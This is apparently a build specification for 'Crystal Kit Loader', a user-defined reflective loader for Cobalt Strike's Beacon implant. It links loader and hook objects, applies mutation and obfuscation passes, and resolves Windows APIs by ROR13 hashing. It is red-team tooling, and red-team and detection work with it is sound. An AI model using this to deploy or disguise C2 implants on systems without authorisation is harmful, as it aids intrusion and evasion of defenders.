name       "Crystal Kit Loader"
describe   "A UDRL for Cobalt Strike's Beacon."
author     "@_RastaMouse"
license    "MIT"
reference  "https://rastamouse.me/crystal-kit/"
defraw     "$DLL" "Beacon DLL"

initpic.x64:
    make pic +gofirst +disco +mutate +blockparty +shatter +optimize
    
    load "bin/services.x64.o"
        merge
    
    dfr "resolve" "ror13" "KERNEL32, NTDLL"
    dfr "resolve_ext" "strings"
    
    mergelib "../libtcg.x64.zip"

x64:
    load "bin/loader.x64.o"
        .initpic

        foreach %transforms : call %_ "init"

        push $DLL
            foreach %transforms : call %_ "apply"
            prepend "length"
            link "dll"

        foreach %hooks: call %_ "setup"

        load "bin/pico.x64.o"
            make object +disco +mutate +blockparty +shatter
            mergelib "../libtcg.x64.zip"

            foreach %hooks: call %_ "hooks"

            export

        foreach %transforms : call %_ "apply"
        prepend "length"
        link "pico"

        export
